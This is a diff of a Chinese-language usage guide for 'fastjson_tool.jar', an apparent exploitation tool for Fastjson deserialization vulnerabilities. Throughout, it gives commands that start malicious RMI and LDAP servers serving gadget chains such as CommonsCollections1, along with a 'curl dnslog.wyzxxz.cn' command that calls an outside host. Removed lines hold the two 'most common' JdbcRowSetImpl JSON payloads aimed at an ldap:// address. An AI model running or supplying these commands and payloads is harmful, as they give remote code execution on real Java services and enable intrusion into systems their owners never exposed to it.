@@ -3,23 +3,16 @@
 ```
 1. RMI (need tomcat8)
 java -cp fastjson_tool.jar EvilRMIServer 1099 8888 "curl dnslog.wyzxxz.cn"
-创建一个rmi服务, rmi的端口为1099，另一个通信的端口8888，后面写要执行的命令。
-
 
 
 2. RMI/LDAP + HTTP
-java -cp fastjson_tool.jar EvilRMIServer3 1099 127.0.0.1 8888 "curl dnslog.wyzxxz.cn"
+java -cp fastjson_tool.jar HRMIServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"
 /
-java -cp fastjson_tool.jar LDAPRefServer3 1099 127.0.0.1 8888 "curl dnslog.wyzxxz.cn"
-
-创建一个RMI/LDAP服务和一个HTTP服务，1099为RMI/LDAP服务的端口, 
-127.0.0.1为http服务IP地址，8888为http的端口，后面写要执行的命令。
-
+java -cp fastjson_tool.jar HLDAPServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"
 
 
 3. LDAP2
-java -cp fastjson_tool.jar LDAPRefServer2 1099 CommonsCollections1 "curl dnslog.wyzxxz.cn"
-创建一个LDAP服务，1099为ldap服务的端口，后面写要用发序列化的payload，以及要执行的命令，
+java -cp fastjson_tool.jar LDAPRefServer2 80 CommonsCollections1 "curl dnslog.wyzxxz.cn"
 CommonsBeanutils1  
 CommonsCollections1
 CommonsCollections2
@@ -62,7 +55,7 @@ User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X)
 
 ldap:
 1. 启动LDAP服务，后面写要执行的语句
-java -cp fastjson_tool.jar LDAPRefServer3 1099 127.0.0.1 8888 "curl dnslog.wyzxxz.cn"
+java -cp fastjson_tool.jar HLDAPServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"
 
 2. 发送请求包
 POST /test HTTP/1.1
@@ -105,11 +98,6 @@ else:
 有些环境可能利用不成功，可以尝试默认的测试方法,
 
 
-=======================================================
-最常用的2个如下：
-{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:8888/Object","autoCommit":true}
-
-{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:8888/Object","autoCommit":true}}
 
 ```
 
